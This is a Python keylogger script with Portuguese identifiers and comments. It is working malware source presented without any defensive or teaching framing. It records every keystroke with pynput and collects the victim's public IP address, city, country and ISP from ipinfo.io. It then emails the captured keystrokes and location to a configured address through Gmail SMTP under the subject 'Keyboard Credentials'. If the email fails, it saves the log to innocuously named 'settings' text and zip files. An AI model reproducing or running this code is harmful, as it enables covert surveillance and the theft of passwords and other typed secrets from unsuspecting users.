##### KEYLOGGER #####

from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import requests
import time
import zipfile
import os

def iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject, tempo_maximo=60):
    teclas = []
    tempo_inicial = time.time()  
    num_zip = 1
    num_txt = 1  

    def processar_tecla(tecla):
        if hasattr(tecla, 'char'):
            return tecla.char
        elif tecla == Key.space:
            return ' '
        else:
            return str(tecla)

    def log(tecla):
        nonlocal num_zip, num_txt
        tecla_processada = processar_tecla(tecla)
        if tecla_processada is not None:
            teclas.append(tecla_processada)
            if time.time() - tempo_inicial >= tempo_maximo:
                encerrar_keylogger(num_zip, num_txt)  

    def obter_informacoes_ip():
        try:
            resposta = requests.get("https://ipinfo.io")

            if resposta.status_code == 200:
                dados_ip = resposta.json()

                info_string = f"IP Público: {dados_ip['ip']}\n"
                info_string += f"Cidade: {dados_ip['city']}\n"
                info_string += f"Região: {dados_ip['region']}\n"
                info_string += f"País: {dados_ip['country']}\n"
                info_string += f"Provedor de Internet: {dados_ip['org']}\n"

                return info_string
            else:
                return f"Falha na solicitação: {resposta.status_code}"

        except Exception as e:
            return f"Erro ao obter informações do IP: {e}"

    def send_email(body):
        try:
            smtp_server = "smtp.gmail.com"
            smtp_port = 587

            mensagem = MIMEMultipart()
            mensagem['From'] = remetente_email
            mensagem['To'] = destinatario_email
            mensagem['Subject'] = subject

            mensagem.attach(MIMEText(body, 'plain'))

            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(remetente_email, remetente_senha)
                server.send_message(mensagem)

            print("Email enviado com sucesso!")
            return True

        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")
            return False

    def encerrar_keylogger(num_zip, num_txt):
        resultado_teclas = ' '.join(teclas)
        info_data = obter_informacoes_ip()

        corpo_email = f"""##########

Keyboard: {resultado_teclas}

Informações de IP:
{info_data}

##########"""

        try:
            if not send_email(corpo_email):
                with open(f"settings{num_txt}.txt", "a") as arquivo:
                    arquivo.write(f"Erro ao enviar e-mail:\n{corpo_email}\n")

            if os.path.exists(f"settings{num_txt}.txt"):
                num_zip = 1
                num_txt = 1

                while os.path.exists(f"settings{num_zip}.zip"):
                    num_zip += 1

                with zipfile.ZipFile(f"settings{num_zip}.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
                    zipf.write(f"settings{num_txt}.txt")  # Grava o arquivo .txt correspondente ao número do .zip

                os.remove(f"settings{num_txt}.txt")

                exit(0)
            else:
                print("O arquivo .txt não existe. Nenhum arquivo ZIP será criado.")
                exit(1)

        except Exception as e:
            print(f"Erro ao encerrar keylogger: {e}")
            exit(1)

    try:
        with Listener(on_press=log) as monitor:
            monitor.join()

    except (KeyboardInterrupt, AttributeError):
        print('Encerrando monitoramento...')
        encerrar_keylogger(num_zip, num_txt)

if __name__ == "__main__":
    remetente_email = "seu_email@gmail.com"  # Substitua pelo seu e-mail
    remetente_senha = "sua_senha"  # Substitua pela sua senha de e-mail
    destinatario_email = "email_de_destino@gmail.com"  # Substitua pelo endereço de e-mail do destinatário
    subject = "Keyboard Credentials"
    
    iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject)

